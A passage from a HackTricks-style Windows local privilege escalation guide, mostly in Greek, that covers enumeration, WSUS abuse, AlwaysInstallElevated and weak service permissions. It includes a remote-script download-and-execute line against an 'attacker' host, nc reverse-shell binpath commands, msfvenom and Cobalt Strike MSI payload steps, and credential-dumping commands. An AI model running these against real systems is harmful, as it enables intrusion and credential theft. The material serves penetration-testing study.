# Windows Local Privilege Escalation

{{#include ../../banners/hacktricks-training.md}}

### **Best tool to look for Windows local privilege escalation vectors:** [**WinPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS)

## Initial Windows Theory

### Access Tokens

**If you don't know what are Windows Access Tokens, read the following page before continuing:**


{{#ref}}
access-tokens.md
{{#endref}}

### ACLs - DACLs/SACLs/ACEs

**Check the following page for more info about ACLs - DACLs/SACLs/ACEs:**


{{#ref}}
acls-dacls-sacls-aces.md
{{#endref}}

### Integrity Levels

**If you don't know what are integrity levels in Windows you should read the following page before continuing:**


{{#ref}}
integrity-levels.md
{{#endref}}

## Windows Security Controls

Υπάρχουν διάφορα στοιχεία στα Windows που μπορούν να **σας αποτρέψουν από το enumerating του συστήματος**, να εκτελέσετε εκτελέσιμα ή ακόμη και να **ανιχνεύσουν τις δραστηριότητές σας**. Θα πρέπει να **διαβάσετε** την παρακάτω **σελίδα** και να **enumerate** όλους αυτούς τους μηχανισμούς άμυνας πριν ξεκινήσετε την privilege escalation enumeration:


{{#ref}}
../authentication-credentials-uac-and-efs/
{{#endref}}

### Admin Protection / UIAccess silent elevation

UIAccess processes launched through `RAiLaunchAdminProcess` can be abused to reach High IL without prompts when AppInfo secure-path checks are bypassed. Check the dedicated UIAccess/Admin Protection bypass workflow here:

{{#ref}}
uiaccess-admin-protection-bypass.md
{{#endref}}

## System Info

### Version info enumeration

Ελέγξτε αν η έκδοση των Windows έχει κάποια γνωστή ευπάθεια (ελέγξτε επίσης τα εφαρμοσμένα patches).
```bash
systeminfo
systeminfo | findstr /B /C:"OS Name" /C:"OS Version" #Get only that information
wmic qfe get Caption,Description,HotFixID,InstalledOn #Patches
wmic os get osarchitecture || echo %PROCESSOR_ARCHITECTURE% #Get system architecture
```

```bash
[System.Environment]::OSVersion.Version #Current OS version
Get-WmiObject -query 'select * from win32_quickfixengineering' | foreach {$_.hotfixid} #List all patches
Get-Hotfix -description "Security update" #List only "Security Update" patches
```
### Εκμεταλλεύσεις εκδόσεων

Αυτό το [site](https://msrc.microsoft.com/update-guide/vulnerability) είναι χρήσιμο για την αναζήτηση λεπτομερών πληροφοριών σχετικά με τις ευπάθειες ασφάλειας της Microsoft. Αυτή η βάση δεδομένων περιλαμβάνει περισσότερες από 4.700 ευπάθειες ασφάλειας, δείχνοντας την **τεράστια επιφάνεια επίθεσης** που παρουσιάζει ένα περιβάλλον Windows.

**Στο σύστημα**

- _post/windows/gather/enum_patches_
- _post/multi/recon/local_exploit_suggester_
- [_watson_](https://github.com/rasta-mouse/Watson)
- [_winpeas_](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite) _(Winpeas έχει ενσωματωμένο watson)_

**Τοπικά με πληροφορίες συστήματος**

- [https://github.com/AonCyberLabs/Windows-Exploit-Suggester](https://github.com/AonCyberLabs/Windows-Exploit-Suggester)
- [https://github.com/bitsadmin/wesng](https://github.com/bitsadmin/wesng)

**Github repos of exploits:**

- [https://github.com/nomi-sec/PoC-in-GitHub](https://github.com/nomi-sec/PoC-in-GitHub)
- [https://github.com/abatchy17/WindowsExploits](https://github.com/abatchy17/WindowsExploits)
- [https://github.com/SecWiki/windows-kernel-exploits](https://github.com/SecWiki/windows-kernel-exploits)

### Περιβάλλον

Κάποιες credential/Juicy πληροφορίες είναι αποθηκευμένες στις env variables;
```bash
set
dir env:
Get-ChildItem Env: | ft Key,Value -AutoSize
```
### PowerShell Ιστορικό
```bash
ConsoleHost_history #Find the PATH where is saved

type %userprofile%\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
type C:\Users\swissky\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
type $env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
cat (Get-PSReadlineOption).HistorySavePath
cat (Get-PSReadlineOption).HistorySavePath | sls passw
```
### Αρχεία Transcript του PowerShell

Μπορείτε να μάθετε πώς να το ενεργοποιήσετε στο [https://sid-500.com/2017/11/07/powershell-enabling-transcription-logging-by-using-group-policy/](https://sid-500.com/2017/11/07/powershell-enabling-transcription-logging-by-using-group-policy/)
```bash
#Check is enable in the registry
reg query HKCU\Software\Policies\Microsoft\Windows\PowerShell\Transcription
reg query HKLM\Software\Policies\Microsoft\Windows\PowerShell\Transcription
reg query HKCU\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\Transcription
reg query HKLM\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\Transcription
dir C:\Transcripts

#Start a Transcription session
Start-Transcript -Path "C:\transcripts\transcript0.txt" -NoClobber
Stop-Transcript
```
### PowerShell Module Logging

Καταγράφονται λεπτομέρειες των εκτελέσεων pipeline του PowerShell, περιλαμβανομένων των εντολών που εκτελέστηκαν, των κλήσεων εντολών και τμημάτων των scripts. Ωστόσο, οι πλήρεις λεπτομέρειες εκτέλεσης και τα αποτελέσματα εξόδου ενδέχεται να μην καταγραφούν.

Για να το ενεργοποιήσετε, ακολουθήστε τις οδηγίες στην ενότητα "Transcript files" της τεκμηρίωσης, επιλέγοντας **"Module Logging"** αντί για **"Powershell Transcription"**.
```bash
reg query HKCU\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
reg query HKLM\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
reg query HKCU\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
reg query HKLM\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
```
Για να δείτε τα τελευταία 15 events από τα PowersShell logs μπορείτε να εκτελέσετε:
```bash
Get-WinEvent -LogName "windows Powershell" | select -First 15 | Out-GridView
```
### PowerShell **Script Block Logging**

Καταγράφεται ένα πλήρες αρχείο δραστηριότητας και ολόκληρο το περιεχόμενο της εκτέλεσης του script, διασφαλίζοντας ότι κάθε block του code τεκμηριώνεται καθώς εκτελείται. Αυτή η διαδικασία διατηρεί ένα ολοκληρωμένο audit trail κάθε ενέργειας, πολύτιμο για forensics και για την ανάλυση κακόβουλης συμπεριφοράς. Με την τεκμηρίωση όλης της δραστηριότητας τη στιγμή της εκτέλεσης, παρέχονται λεπτομερείς πληροφορίες για τη διαδικασία.
```bash
reg query HKCU\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
reg query HKLM\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
reg query HKCU\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
reg query HKLM\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
```
Τα συμβάντα καταγραφής για το Script Block μπορούν να βρεθούν στον Windows Event Viewer στη διαδρομή: **Application and Services Logs > Microsoft > Windows > PowerShell > Operational**.\
Για να δείτε τα τελευταία 20 συμβάντα μπορείτε να χρησιμοποιήσετε:
```bash
Get-WinEvent -LogName "Microsoft-Windows-Powershell/Operational" | select -first 20 | Out-Gridview
```
### Ρυθμίσεις Διαδικτύου
```bash
reg query "HKCU\Software\Microsoft\Windows\CurrentVersion\Internet Settings"
reg query "HKLM\Software\Microsoft\Windows\CurrentVersion\Internet Settings"
```
### Μονάδες δίσκου
```bash
wmic logicaldisk get caption || fsutil fsinfo drives
wmic logicaldisk get caption,description,providername
Get-PSDrive | where {$_.Provider -like "Microsoft.PowerShell.Core\FileSystem"}| ft Name,Root
```
## WSUS

Μπορείτε να παραβιάσετε το σύστημα αν οι ενημερώσεις δεν ζητούνται χρησιμοποιώντας http**S** αλλά http.

Ξεκινάτε ελέγχοντας αν το δίκτυο χρησιμοποιεί μη-SSL WSUS ενημέρωση εκτελώντας το ακόλουθο στο cmd:
```
reg query HKLM\Software\Policies\Microsoft\Windows\WindowsUpdate /v WUServer
```
Ή το ακόλουθο στο PowerShell:
```
Get-ItemProperty -Path HKLM:\Software\Policies\Microsoft\Windows\WindowsUpdate -Name "WUServer"
```
Εάν λάβετε μια απάντηση όπως μία από αυτές:
```bash
HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\WindowsUpdate
WUServer    REG_SZ    http://xxxx-updxx.corp.internal.com:8535
```

```bash
WUServer     : http://xxxx-updxx.corp.internal.com:8530
PSPath       : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\software\policies\microsoft\windows\windowsupdate
PSParentPath : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\software\policies\microsoft\windows
PSChildName  : windowsupdate
PSDrive      : HKLM
PSProvider   : Microsoft.PowerShell.Core\Registry
```
Και αν `HKLM\Software\Policies\Microsoft\Windows\WindowsUpdate\AU /v UseWUServer` ή `Get-ItemProperty -Path hklm:\software\policies\microsoft\windows\windowsupdate\au -name "usewuserver"` είναι ίσο με `1`.

Τότε, **it is exploitable.** Αν η τελευταία τιμή μητρώου ισούται με 0, τότε η καταχώρηση WSUS θα αγνοηθεί.

Για να εκμεταλλευτείτε αυτές τις ευπάθειες μπορείτε να χρησιμοποιήσετε εργαλεία όπως: [Wsuxploit](https://github.com/pimps/wsuxploit), [pyWSUS ](https://github.com/GoSecure/pywsus) - Αυτά είναι MiTM weaponized exploits scripts για να εισάγουν 'fake' updates στην μη-SSL WSUS κίνηση.

Read the research here:

{{#file}}
CTX_WSUSpect_White_Paper (1).pdf
{{#endfile}}

**WSUS CVE-2020-1013**

[**Read the complete report here**](https://www.gosecure.net/blog/2020/09/08/wsus-attacks-part-2-cve-2020-1013-a-windows-10-local-privilege-escalation-1-day/).\
Βασικά, αυτό είναι το σφάλμα που αυτό το bug εκμεταλλεύεται:

> Αν έχουμε τη δυνατότητα να τροποποιήσουμε τον τοπικό user proxy μας, και τα Windows Updates χρησιμοποιούν τον proxy που έχει ρυθμιστεί στις ρυθμίσεις του Internet Explorer, τότε έχουμε τη δυνατότητα να τρέξουμε το [PyWSUS](https://github.com/GoSecure/pywsus) τοπικά για να υποκλέψουμε την ίδια μας την κίνηση και να τρέξουμε κώδικα ως elevated user στο asset μας.
>
> Επιπλέον, αφού η υπηρεσία WSUS χρησιμοποιεί τις ρυθμίσεις του τρέχοντος χρήστη, θα χρησιμοποιήσει επίσης το certificate store του. Αν παράγουμε ένα self-signed certificate για το WSUS hostname και προσθέσουμε αυτό το πιστοποιητικό στο certificate store του τρέχοντος χρήστη, θα μπορέσουμε να υποκλέψουμε τόσο HTTP όσο και HTTPS WSUS κίνηση. Το WSUS δεν χρησιμοποιεί μηχανισμούς τύπου HSTS για να εφαρμόσει έναν έλεγχο trust-on-first-use στο πιστοποιητικό. Αν το παρουσιαζόμενο πιστοποιητικό εμπιστεύεται από τον χρήστη και έχει το σωστό hostname, θα γίνει αποδεκτό από την υπηρεσία.

Μπορείτε να εκμεταλλευτείτε αυτήν την ευπάθεια χρησιμοποιώντας το εργαλείο [**WSUSpicious**](https://github.com/GoSecure/wsuspicious) (όταν απελευθερωθεί).

## Αυτοματοποιημένα update τρίτων και Agent IPC (local privesc)

Πολλοί enterprise agents εκθέτουν μια localhost IPC επιφάνεια και ένα privileged update κανάλι. Εάν η enrollment μπορεί να εξαναγκαστεί σε έναν attacker server και ο updater εμπιστεύεται ένα rogue root CA ή έχει αδύναμους signer checks, ένας τοπικός χρήστης μπορεί να παραδώσει ένα malicious MSI που η υπηρεσία SYSTEM εγκαθιστά. Δείτε μια γενικευμένη τεχνική (βασισμένη στην αλυσίδα Netskope stAgentSvc – CVE-2025-0309) εδώ:

{{#ref}}
abusing-auto-updaters-and-ipc.md
{{#endref}}

## Veeam Backup & Replication CVE-2023-27532 (SYSTEM via TCP 9401)

Το Veeam B&R < `11.0.1.1261` εκθέτει μια τοπική υπηρεσία στο **TCP/9401** που επεξεργάζεται attacker-controlled μηνύματα, επιτρέποντας αυθαίρετες εντολές ως **NT AUTHORITY\SYSTEM**.

- **Recon**: επιβεβαιώστε τον listener και την έκδοση, π.χ., `netstat -ano | findstr 9401` και `(Get-Item "C:\Program Files\Veeam\Backup and Replication\Backup\Veeam.Backup.Shell.exe").VersionInfo.FileVersion`.
- **Exploit**: τοποθετήστε ένα PoC όπως `VeeamHax.exe` με τα απαιτούμενα Veeam DLLs στον ίδιο κατάλογο, στη συνέχεια πυροδοτήστε ένα SYSTEM payload μέσω του τοπικού socket:
```powershell
.\VeeamHax.exe --cmd "powershell -ep bypass -c \"iex(iwr http://attacker/shell.ps1 -usebasicparsing)\""
```
Η υπηρεσία εκτελεί την εντολή ως SYSTEM.
## KrbRelayUp

Υφίσταται ευπάθεια **local privilege escalation** σε περιβάλλοντα Windows **domain** υπό συγκεκριμένες συνθήκες. Αυτές οι συνθήκες περιλαμβάνουν περιβάλλοντα όπου **LDAP signing is not enforced,** χρήστες διαθέτουν self-rights που τους επιτρέπουν να διαμορφώσουν **Resource-Based Constrained Delegation (RBCD),** και τη δυνατότητα για χρήστες να δημιουργούν υπολογιστές εντός του domain. Σημειώστε ότι αυτές οι **requirements** ικανοποιούνται με τις **default settings**.

Βρείτε το **exploit στο** [**https://github.com/Dec0ne/KrbRelayUp**](https://github.com/Dec0ne/KrbRelayUp)

Για περισσότερες πληροφορίες σχετικά με τη ροή της επίθεσης δείτε [https://research.nccgroup.com/2019/08/20/kerberos-resource-based-constrained-delegation-when-an-image-change-leads-to-a-privilege-escalation/](https://research.nccgroup.com/2019/08/20/kerberos-resource-based-constrained-delegation-when-an-image-change-leads-to-a-privilege-escalation/)

## AlwaysInstallElevated

**Αν** αυτές οι 2 εγγραφές είναι **ενεργοποιημένες** (τιμή **0x1**), τότε χρήστες οποιουδήποτε επιπέδου προνομίων μπορούν να **εγκαταστήσουν** (εκτελέσουν) `*.msi` αρχεία ως NT AUTHORITY\\**SYSTEM**.
```bash
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
```
### Metasploit payloads
```bash
msfvenom -p windows/adduser USER=rottenadmin PASS=P@ssword123! -f msi-nouac -o alwe.msi #No uac format
msfvenom -p windows/adduser USER=rottenadmin PASS=P@ssword123! -f msi -o alwe.msi #Using the msiexec the uac wont be prompted
```
Αν έχετε μια meterpreter συνεδρία, μπορείτε να αυτοματοποιήσετε αυτή την τεχνική χρησιμοποιώντας το module **`exploit/windows/local/always_install_elevated`**

### PowerUP

Χρησιμοποιήστε την εντολή `Write-UserAddMSI` από το PowerUP για να δημιουργήσετε μέσα στον τρέχοντα κατάλογο ένα Windows MSI binary για να αυξήσετε τα προνόμια. Αυτό το script εξάγει έναν προκατασκευασμένο εγκαταστάτη MSI που ζητά την προσθήκη χρήστη/ομάδας (οπότε θα χρειαστείτε πρόσβαση GIU):
```
Write-UserAddMSI
```
Απλώς εκτελέστε το δημιουργημένο binary για να αποκτήσετε αυξημένα προνόμια.

### MSI Wrapper

Διαβάστε αυτό το tutorial για να μάθετε πώς να δημιουργήσετε έναν MSI wrapper χρησιμοποιώντας αυτά τα εργαλεία. Σημειώστε ότι μπορείτε να περιτυλίξετε ένα "**.bat**" αρχείο αν **just** θέλετε να **execute** **command lines**


{{#ref}}
msi-wrapper.md
{{#endref}}

### Δημιουργία MSI με WIX


{{#ref}}
create-msi-with-wix.md
{{#endref}}

### Δημιουργία MSI με Visual Studio

- **Generate** with Cobalt Strike or Metasploit a **new Windows EXE TCP payload** in `C:\privesc\beacon.exe`
- Ανοίξτε **Visual Studio**, επιλέξτε **Create a new project** και πληκτρολογήστε "installer" στο πεδίο αναζήτησης. Επιλέξτε το project **Setup Wizard** και κάντε κλικ στο **Next**.
- Δώστε στο project ένα όνομα, like **AlwaysPrivesc**, χρησιμοποιήστε **`C:\privesc`** για την τοποθεσία, επιλέξτε **place solution and project in the same directory**, και κάντε κλικ στο **Create**.
- Συνεχίστε να πατάτε **Next** μέχρι να φτάσετε στο βήμα 3 από 4 (choose files to include). Πατήστε **Add** και επιλέξτε το Beacon payload που μόλις δημιουργήσατε. Έπειτα πατήστε **Finish**.
- Επιλέξτε το **AlwaysPrivesc** project στο **Solution Explorer** και στις **Properties**, αλλάξτε το **TargetPlatform** από **x86** σε **x64**.
- Υπάρχουν και άλλες ιδιότητες που μπορείτε να αλλάξετε, όπως τα **Author** και **Manufacturer** τα οποία μπορούν να κάνουν την εγκατεστημένη εφαρμογή να φαίνεται πιο νόμιμη.
- Κάντε δεξί κλικ στο project και επιλέξτε **View > Custom Actions**.
- Κάντε δεξί κλικ στο **Install** και επιλέξτε **Add Custom Action**.
- Κάντε διπλό κλικ στο **Application Folder**, επιλέξτε το αρχείο σας **beacon.exe** και πατήστε **OK**. Αυτό θα διασφαλίσει ότι το beacon payload θα εκτελεστεί μόλις τρέξει ο installer.
- Στις **Custom Action Properties**, αλλάξτε το **Run64Bit** σε **True**.
- Τέλος, **build it**.
- Εάν εμφανιστεί η προειδοποίηση `File 'beacon-tcp.exe' targeting 'x64' is not compatible with the project's target platform 'x86'`, βεβαιωθείτε ότι έχετε ορίσει την πλατφόρμα σε x64.

### MSI Installation

Για να execute την **installation** του κακόβουλου `.msi` αρχείου σε **background:**
```
msiexec /quiet /qn /i C:\Users\Steve.INFERNO\Downloads\alwe.msi
```
Για να εκμεταλλευτείτε αυτή την ευπάθεια μπορείτε να χρησιμοποιήσετε: _exploit/windows/local/always_install_elevated_

## Antivirus και Ανιχνευτές

### Ρυθμίσεις Καταγραφής

Αυτές οι ρυθμίσεις καθορίζουν τι καταγράφεται, οπότε θα πρέπει να προσέξετε
```
reg query HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\System\Audit
```
### WEF

Windows Event Forwarding — ενδιαφέρον είναι να ξέρουμε πού στέλνονται τα logs
```bash
reg query HKLM\Software\Policies\Microsoft\Windows\EventLog\EventForwarding\SubscriptionManager
```
### LAPS

**LAPS** έχει σχεδιαστεί για τη **διαχείριση των local Administrator passwords**, εξασφαλίζοντας ότι κάθε κωδικός είναι **μοναδικός, τυχαίος και ενημερώνεται τακτικά** σε υπολογιστές που έχουν ενταχθεί σε domain. Αυτοί οι κωδικοί αποθηκεύονται με ασφάλεια μέσα στο Active Directory και μπορούν να ανακτηθούν μόνο από χρήστες που έχουν λάβει επαρκή δικαιώματα μέσω ACLs, επιτρέποντάς τους να προβάλουν local admin passwords εάν είναι εξουσιοδοτημένοι.


{{#ref}}
../active-directory-methodology/laps.md
{{#endref}}

### WDigest

Εάν είναι ενεργό, **plain-text passwords are stored in LSASS** (Local Security Authority Subsystem Service).\
[**More info about WDigest in this page**](../stealing-credentials/credentials-protections.md#wdigest).
```bash
reg query 'HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest' /v UseLogonCredential
```
### LSA Protection

Από τα **Windows 8.1**, η Microsoft εισήγαγε ενισχυμένη προστασία για την Local Security Authority (LSA) ώστε να **block** προσπάθειες από μη αξιόπιστες διεργασίες να **read its memory** ή inject code, ενισχύοντας περαιτέρω την ασφάλεια του συστήματος.\
[**More info about LSA Protection here**](../stealing-credentials/credentials-protections.md#lsa-protection).
```bash
reg query 'HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\LSA' /v RunAsPPL
```
### Credentials Guard

**Credential Guard** εισήχθη στα **Windows 10**. Σκοπός του είναι να προστατεύει τα διαπιστευτήρια που αποθηκεύονται σε μια συσκευή από απειλές όπως οι pass-the-hash attacks.| [**More info about Credentials Guard here.**](../stealing-credentials/credentials-protections.md#credential-guard)
```bash
reg query 'HKLM\System\CurrentControlSet\Control\LSA' /v LsaCfgFlags
```
### Cached Credentials

**Domain credentials** επιβεβαιώνονται από την **Local Security Authority** (LSA) και χρησιμοποιούνται από συστατικά του λειτουργικού συστήματος. Όταν τα δεδομένα σύνδεσης ενός χρήστη επιβεβαιώνονται από ένα εγγεγραμμένο security package, τα domain credentials για τον χρήστη συνήθως δημιουργούνται.\
[**Περισσότερες πληροφορίες για Cached Credentials εδώ**](../stealing-credentials/credentials-protections.md#cached-credentials).
```bash
reg query "HKEY_LOCAL_MACHINE\SOFTWARE\MICROSOFT\WINDOWS NT\CURRENTVERSION\WINLOGON" /v CACHEDLOGONSCOUNT
```
## Χρήστες & Ομάδες

### Απαρίθμηση Χρηστών & Ομάδων

Πρέπει να ελέγξετε αν κάποιες από τις ομάδες στις οποίες ανήκετε έχουν ενδιαφέροντα δικαιώματα
```bash
# CMD
net users %username% #Me
net users #All local users
net localgroup #Groups
net localgroup Administrators #Who is inside Administrators group
whoami /all #Check the privileges

# PS
Get-WmiObject -Class Win32_UserAccount
Get-LocalUser | ft Name,Enabled,LastLogon
Get-ChildItem C:\Users -Force | select Name
Get-LocalGroupMember Administrators | ft Name, PrincipalSource
```
### Ομάδες με προνόμια

If you **ανήκετε σε κάποια ομάδα με προνόμια, μπορεί να καταφέρετε να αυξήσετε τα προνόμιά σας**. Μάθετε για τις ομάδες με προνόμια και πώς να τις καταχραστείτε για να αυξήσετε τα προνόμιά σας εδώ:


{{#ref}}
../active-directory-methodology/privileged-groups-and-token-privileges.md
{{#endref}}

### Χειρισμός Token

**Μάθετε περισσότερα** για το τι είναι ένα **token** σε αυτή τη σελίδα: [**Windows Tokens**](../authentication-credentials-uac-and-efs/index.html#access-tokens).\
Δείτε την παρακάτω σελίδα για να **μάθετε για ενδιαφέροντα tokens** και πώς να τα καταχραστείτε:


{{#ref}}
privilege-escalation-abusing-tokens.md
{{#endref}}

### Συνδεδεμένοι χρήστες / Συνεδρίες
```bash
qwinsta
klist sessions
```
### Φάκελοι χρήστη
```bash
dir C:\Users
Get-ChildItem C:\Users
```
### Πολιτική Κωδικών Πρόσβασης
```bash
net accounts
```
### Λήψη του περιεχομένου του clipboard
```bash
powershell -command "Get-Clipboard"
```
## Εκτελούμενες Διαδικασίες

### Δικαιώματα Αρχείων και Φακέλων

Πρώτα απ' όλα, κατά την απαρίθμηση των διεργασιών **έλεγξε για passwords μέσα στο command line της διεργασίας**.\
Δες αν μπορείς να **overwrite some binary running** ή αν έχεις δικαιώματα εγγραφής στον φάκελο του binary για να εκμεταλλευτείς πιθανές [**DLL Hijacking attacks**](dll-hijacking/index.html):
```bash
Tasklist /SVC #List processes running and services
tasklist /v /fi "username eq system" #Filter "system" processes

#With allowed Usernames
Get-WmiObject -Query "Select * from Win32_Process" | where {$_.Name -notlike "svchost*"} | Select Name, Handle, @{Label="Owner";Expression={$_.GetOwner().User}} | ft -AutoSize

#Without usernames
Get-Process | where {$_.ProcessName -notlike "svchost*"} | ft ProcessName, Id
```
Πάντα ελέγχετε για πιθανούς [**electron/cef/chromium debuggers** που τρέχουν — μπορείτε να τα εκμεταλλευτείτε για να escalate privileges](../../linux-hardening/privilege-escalation/electron-cef-chromium-debugger-abuse.md).

**Έλεγχος δικαιωμάτων των binaries των διεργασιών**
```bash
for /f "tokens=2 delims='='" %%x in ('wmic process list full^|find /i "executablepath"^|find /i /v "system32"^|find ":"') do (
for /f eol^=^"^ delims^=^" %%z in ('echo %%x') do (
icacls "%%z"
2>nul | findstr /i "(F) (M) (W) :\\" | findstr /i ":\\ everyone authenticated users todos %username%" && echo.
)
)
```
**Έλεγχος δικαιωμάτων των φακέλων των binaries των διεργασιών (**[**DLL Hijacking**](dll-hijacking/index.html)**)**
```bash
for /f "tokens=2 delims='='" %%x in ('wmic process list full^|find /i "executablepath"^|find /i /v
"system32"^|find ":"') do for /f eol^=^"^ delims^=^" %%y in ('echo %%x') do (
icacls "%%~dpy\" 2>nul | findstr /i "(F) (M) (W) :\\" | findstr /i ":\\ everyone authenticated users
todos %username%" && echo.
)
```
### Εξόρυξη κωδικών από τη μνήμη

Μπορείτε να δημιουργήσετε ένα memory dump μιας διεργασίας που τρέχει χρησιμοποιώντας **procdump** από sysinternals. Υπηρεσίες όπως FTP έχουν τις **credentials in clear text in memory**, δοκιμάστε να κάνετε dump της μνήμης και να διαβάσετε τις credentials.
```bash
procdump.exe -accepteula -ma <proc_name_tasklist>
```
### Ανασφαλείς GUI εφαρμογές

**Εφαρμογές που τρέχουν ως SYSTEM μπορεί να επιτρέπουν σε έναν χρήστη να εκκινήσει ένα CMD ή να περιηγηθεί σε καταλόγους.**

Παράδειγμα: "Windows Help and Support" (Windows + F1), search for "command prompt", click on "Click to open Command Prompt"

## Υπηρεσίες

Οι Service Triggers επιτρέπουν στα Windows να ξεκινήσουν μια υπηρεσία όταν προκύψουν ορισμένες συνθήκες (named pipe/RPC endpoint activity, ETW events, IP availability, device arrival, GPO refresh, κ.λπ.). Ακόμη και χωρίς δικαιώματα SERVICE_START, συχνά μπορείτε να ξεκινήσετε privileged services ενεργοποιώντας τα triggers τους. Δείτε τεχνικές enumeration και activation εδώ:

-
{{#ref}}
service-triggers.md
{{#endref}}

Πάρτε μια λίστα με τις υπηρεσίες:
```bash
net start
wmic service list brief
sc query
Get-Service
```
### Δικαιώματα

Μπορείτε να χρησιμοποιήσετε **sc** για να πάρετε πληροφορίες μιας υπηρεσίας
```bash
sc qc <service_name>
```
Συνιστάται να έχετε το binary **accesschk** από _Sysinternals_ για να ελέγξετε το απαιτούμενο επίπεδο προνομίων για κάθε υπηρεσία.
```bash
accesschk.exe -ucqv <Service_Name> #Check rights for different groups
```
Συνιστάται να ελέγξετε αν οι "Authenticated Users" μπορούν να τροποποιήσουν οποιαδήποτε υπηρεσία:
```bash
accesschk.exe -uwcqv "Authenticated Users" * /accepteula
accesschk.exe -uwcqv %USERNAME% * /accepteula
accesschk.exe -uwcqv "BUILTIN\Users" * /accepteula 2>nul
accesschk.exe -uwcqv "Todos" * /accepteula ::Spanish version
```
[You can download accesschk.exe for XP for here](https://github.com/ankh2054/windows-pentest/raw/master/Privelege/accesschk-2003-xp.exe)

### Ενεργοποίηση υπηρεσίας

Αν λαμβάνετε αυτό το σφάλμα (για παράδειγμα με SSDPSRV):

_System error 1058 has occurred._\
_The service cannot be started, either because it is disabled or because it has no enabled devices associated with it._

Μπορείτε να την ενεργοποιήσετε χρησιμοποιώντας
```bash
sc config SSDPSRV start= demand
sc config SSDPSRV obj= ".\LocalSystem" password= ""
```
**Λάβετε υπόψη ότι η υπηρεσία upnphost εξαρτάται από την SSDPSRV για να λειτουργήσει (για XP SP1)**

**Μια άλλη λύση για αυτό το πρόβλημα είναι να εκτελέσετε:**
```
sc.exe config usosvc start= auto
```
### **Τροποποίηση διαδρομής δυαδικού αρχείου υπηρεσίας**

Στο σενάριο όπου η ομάδα "Authenticated users" κατέχει **SERVICE_ALL_ACCESS** σε μια υπηρεσία, είναι δυνατή η τροποποίηση του εκτελέσιμου binary της υπηρεσίας. Για να τροποποιήσετε και να εκτελέσετε το **sc**:
```bash
sc config <Service_Name> binpath= "C:\nc.exe -nv 127.0.0.1 9988 -e C:\WINDOWS\System32\cmd.exe"
sc config <Service_Name> binpath= "net localgroup administrators username /add"
sc config <Service_Name> binpath= "cmd \c C:\Users\nc.exe 10.10.10.10 4444 -e cmd.exe"

sc config SSDPSRV binpath= "C:\Documents and Settings\PEPE\meter443.exe"
```
### Επανεκκίνηση υπηρεσίας
```bash
wmic service NAMEOFSERVICE call startservice
net stop [service name] && net start [service name]
```
Τα προνόμια μπορούν να αυξηθούν μέσω διαφόρων δικαιωμάτων:

- **SERVICE_CHANGE_CONFIG**: Επιτρέπει την επαναδιαμόρφωση του service binary.
- **WRITE_DAC**: Επιτρέπει την επαναδιαμόρφωση δικαιωμάτων, οδηγώντας στην ικανότητα να αλλάξετε τις ρυθμίσεις της υπηρεσίας.
- **WRITE_OWNER**: Επιτρέπει την απόκτηση ιδιοκτησίας και την επαναδιαμόρφωση δικαιωμάτων.
- **GENERIC_WRITE**: Κληρονομεί την ικανότητα να αλλάζει τις ρυθμίσεις της υπηρεσίας.
- **GENERIC_ALL**: Επίσης κληρονομεί την ικανότητα να αλλάζει τις ρυθμίσεις της υπηρεσίας.

Για την ανίχνευση και εκμετάλλευση αυτής της ευπάθειας, μπορείτε να χρησιμοποιήσετε το _exploit/windows/local/service_permissions_.

### Services binaries weak permissions

**Ελέγξτε αν μπορείτε να τροποποιήσετε το binary που εκτελείται από μια service** ή αν έχετε **write permissions on the folder** όπου βρίσκεται το binary ([**DLL Hijacking**](dll-hijacking/index.html))**.**\
Μπορείτε να πάρετε κάθε binary που εκτελείται από μια service χρησιμοποιώντας **wmic** (not in system32) και να ελέγξετε τα δικαιώματά σας χρησιμοποιώντας **icacls**:
```bash
for /f "tokens=2 delims='='" %a in ('wmic service list full^|find /i "pathname"^|find /i /v "system32"') do @echo %a >> %temp%\perm.txt

for /f eol^=^"^ delims^=^" %a in (%temp%\perm.txt) do cmd.exe /c icacls "%a" 2>nul | findstr "(M) (F) :\"
```
Μπορείτε επίσης να χρησιμοποιήσετε **sc** και **icacls**:
```bash
sc query state= all | findstr "SERVICE_NAME:" >> C:\Temp\Servicenames.txt
FOR /F "tokens=2 delims= " %i in (C:\Temp\Servicenames.txt) DO @echo %i >> C:\Temp\services.txt
FOR /F %i in (C:\Temp\services.txt) DO @sc qc %i | findstr "BINARY_PATH_NAME" >> C:\Temp\path.txt
```
### Δικαιώματα τροποποίησης μητρώου υπηρεσιών

Πρέπει να ελέγξετε αν μπορείτε να τροποποιήσετε κάποιο μητρώο υπηρεσιών.\
Μπορείτε να **ελέγξετε** τα **δικαιώματά** σας σε ένα **μητρώο** υπηρεσιών κάνοντας:
```bash
reg query hklm\System\CurrentControlSet\Services /s /v imagepath #Get the binary paths of the services

#Try to write every service with its current content (to check if you have write permissions)
for /f %a in ('reg query hklm\system\currentcontrolset\services') do del %temp%\reg.hiv 2>nul & reg save %a %temp%\reg.hiv 2>nul && reg restore %a %temp%\reg.hiv 2>nul && echo You can modify %a

